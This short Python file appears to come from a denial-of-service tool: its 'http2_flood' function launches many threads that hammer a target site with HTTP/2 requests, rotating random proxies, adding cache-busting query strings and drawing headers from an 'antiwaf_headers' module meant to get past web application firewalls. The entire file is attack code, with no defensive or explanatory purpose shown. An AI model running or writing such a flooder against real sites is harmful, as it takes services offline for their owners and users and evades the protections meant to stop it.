
import threading
import httpx
from utils.antiwaf_headers import generate_headers
from utils.proxy_manager import get_random_proxy

def worker(target):
    try:
        with httpx.Client(http2=True, proxies=get_random_proxy(), timeout=10) as client:
            response = client.get(f"{target}/?cache={threading.get_ident()}", headers=generate_headers())
            print(f"Status: {response.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")

def http2_flood(target, threads):
    print(f"Starting HTTP/2 flood on {target} with {threads} threads...")
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(target,))
        t.start()
